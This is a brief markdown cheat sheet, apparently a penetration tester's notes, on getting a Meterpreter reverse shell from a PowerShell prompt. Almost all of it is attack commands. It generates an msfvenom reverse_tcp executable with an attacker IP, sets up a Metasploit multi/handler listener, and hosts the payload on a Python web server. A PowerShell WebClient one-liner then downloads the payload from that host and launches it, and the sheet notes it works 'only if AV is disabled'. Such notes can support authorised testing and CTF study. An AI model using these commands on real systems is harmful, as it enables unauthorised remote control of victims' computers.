## Powershell to Meterpreter Shell
- only if AV is disabled

- **Msfvenom**
  -  `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=5555 -f exe > sh.exe`
  -  chmod +x
  -  set up metasploit listener
  -  msfconsole
  -  search exploit/multi/handler
  -  use 6
  -  set payload windows/meterpreter/reverse_tcp
  -  set lport (match what is in payload)
  -  set lhost
  -  run
  -  host webserver where file located
    - `python -m SimpleHTTPServer 80`   

- **Powershell**
  - from current powershell
  - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.0.0.10:80/shell-name.exe', 'shell-name.exe')"`
    - Example:
      - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.0.0.10:80/shell.exe', 'shell.exe')"`
  - dir to make sure in there
  - `Start-Process "shell-name.exe"`
  - if not working `cd C:\Windows\Temp`
